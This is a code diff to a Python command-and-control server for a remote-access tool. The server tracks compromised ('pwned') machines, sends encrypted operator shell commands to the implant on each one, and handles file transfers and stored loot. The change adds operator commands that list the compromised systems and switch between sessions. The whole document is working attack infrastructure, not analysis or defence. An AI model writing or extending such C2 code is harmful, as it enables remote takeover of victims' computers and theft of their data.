@@ -6,7 +6,7 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import unquote_plus
 from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
-    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, STORAGE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, STORAGE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode, C2Commands
 from inputimeout import inputimeout, TimeoutOccurred
 from os import mkdir, path
 
@@ -83,16 +83,30 @@ class C2Handler(BaseHTTPRequestHandler):
                         cmd = KEEP_ALIVE_CMD
                 else:
                     cmd = input("{client_account}@{client_hostname}:{cwd}$ ")
-                try:
-                    self.http_response(HTTPStatusCode.OK.value)
-                    # passing back command to client; must be utf-8 encode
-                    self.wfile.write(cipher.encrypt(cmd.encode()))
-                except BrokenPipeError as e:
-                    print(f"Lost connection to {pwned_dict[active_session]}.\n")
-                    get_new_session()
-                else:
-                    if cmd.startswith("client kill"):
+
+                if cmd.startswith(C2Commands.SERV.value): # server cmd for infos about target systems 
+                    if cmd.startswith(C2Commands.SERV_SH_CLS.value):
+                        print("Available pwned systems:")
+                        print_last = None
+                        for key, value in pwned_dict.items():
+                            if key == active_session:
+                                print_last = str(key) + " - " + value
+                            else:
+                                print(key, "-", value)
+                        print("\nYour active session:", print_last, sep="\n")
+                    elif cmd.startswith(C2Commands.SERV_CTRL.value):
+                        pass
+                else:        
+                    try:
+                        self.http_response(HTTPStatusCode.OK.value)
+                        # passing back command to client; must be utf-8 encode
+                        self.wfile.write(cipher.encrypt(cmd.encode()))
+                    except BrokenPipeError as e:
+                        print(f"Lost connection to {pwned_dict[active_session]}.\n")
                         get_new_session()
+                    else:
+                        if cmd.startswith("client kill"):
+                            get_new_session()
                     
 
             # if client is in pwned_dict but is not our active session
